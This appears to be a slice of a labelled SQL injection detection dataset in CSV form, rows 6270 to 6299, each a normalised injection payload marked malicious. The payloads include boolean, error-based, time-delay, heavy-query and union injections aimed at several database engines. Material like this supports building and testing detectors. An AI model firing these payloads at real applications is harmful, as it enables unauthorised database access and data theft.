row_index,payload_norm,label,sqli_type_hint
6270,"iif ( 2976 = 2976,1,1/0 )",1,
6271,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""xyjg"" = ""xyjg",1,
6272,"-6636' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'kgip' = 'kgip",1,
6273,"1 ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 8018 = 8018",1,
6274,1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',1,
6275,"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",1,
6276,"1' ) as yuqv where 6007 = 6007 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
6277,"1 ) as rbmn where 5948 = 5948 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
6278,-6109 union all select 6784--,1,
6279,"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""oyou"" = ""oyou",1,
6280,"1"" ) as nfpe where 2679 = 2679",1,
6281,select ( case when ( 8233 = 1074 ) then 8233 else 1/ ( select 0 ) end ) --,1,
6282,"1"" ) as hsws where 6656 = 6656",1,
6283,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'ywxc' = 'ywxc",1,
6284,"1' in boolean mode ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) #",1,
6285,"1' and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
6286,"1,extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",1,
6287,1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
6288,1 ) as pqle where 4039 = 4039 and 7533 = 7533--,1,
6289,"1"" ) ) as jmoy where 9676 = 9676 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
6290,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""gcyp"" like ""gcyp",1,
6291,-8023' in boolean mode ) order by 1#,1,
6292,"-4205' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
6293,1 where 5828 = 5828 and ( 3020 = 3020 ) *6703--,1,
6294,1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,1,
6295,1 ) and ( 3020 = 3020 ) *6703,1,
6296,"1 ) ) as aqpy where 4027 = 4027 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6297,"-9136' ) or make_set ( 9354 = 9354,7185 )",1,
6298,"1 ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
6299,"1%' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( '%' = '",1,
